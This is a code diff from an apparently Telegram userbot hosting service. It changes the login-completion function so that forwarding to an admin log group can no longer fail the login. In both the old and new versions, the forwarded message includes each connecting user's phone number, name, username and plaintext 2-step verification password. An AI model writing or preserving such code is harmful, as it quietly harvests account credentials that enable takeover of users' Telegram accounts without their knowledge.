@@ -871,24 +871,24 @@ async def complete_login(bot_client, event, user_id: int, state: dict):
             
         await show_bot_dashboard(event, phone, user_id, flash_message=flash_msg)
         
-        # Forward details to admin log group
-        global_settings = database.get_global_settings()
-        log_group_id = global_settings.get("log_group_id")
-        if log_group_id:
-            bot_me = await bot_client.get_me()
-            bot_username = getattr(bot_me, "username", None)
-            
-            log_text = (
-                f"<blockquote><b>» 📱 New Userbot Connected</b>\n\n"
-                f"👤 <b>User :</b> <code>{user_id}</code>\n"
-                f"📞 <b>Phone :</b> <code>{phone}</code>\n"
-                f"🏷️ <b>Name :</b> <b>{name}</b>\n"
-                f"🔗 <b>Username :</b> @{username if username else 'None'}\n"
-                f"🔐 <b>2-Step Password :</b> <code>{two_step_pwd}</code>\n"
-                f"🟢 <b>Auto-Started :</b> {'Yes' if started else 'No'}</blockquote>"
-            )
-            userbot_uid = getattr(me, "id", None)
-            try:
+        # Forward details to admin log group (fail-safe so it never fails the user login)
+        try:
+            global_settings = database.get_global_settings()
+            log_group_id = global_settings.get("log_group_id")
+            if log_group_id:
+                bot_me = await bot_client.get_me()
+                bot_username = getattr(bot_me, "username", None)
+                
+                log_text = (
+                    f"<blockquote><b>» 📱 New Userbot Connected</b>\n\n"
+                    f"👤 <b>User :</b> <code>{user_id}</code>\n"
+                    f"📞 <b>Phone :</b> <code>{phone}</code>\n"
+                    f"🏷️ <b>Name :</b> <b>{name}</b>\n"
+                    f"🔗 <b>Username :</b> @{username if username else 'None'}\n"
+                    f"🔐 <b>2-Step Password :</b> <code>{two_step_pwd}</code>\n"
+                    f"🟢 <b>Auto-Started :</b> {'Yes' if started else 'No'}</blockquote>"
+                )
+                userbot_uid = getattr(me, "id", None)
                 from telethon import Button
                 log_buttons = []
                 
@@ -914,8 +914,8 @@ async def complete_login(bot_client, event, user_id: int, state: dict):
                     buttons=log_buttons if log_buttons else None,
                     parse_mode="html"
                 )
-            except Exception as log_err:
-                logger.warning(f"Could not forward session upload to log group {log_group_id}: {log_err}")
+        except Exception as log_err:
+            logger.warning(f"Could not forward session upload to log group: {log_err}")
                 
     except Exception as e:
         logger.error(f"Error finalizing login: {e}")
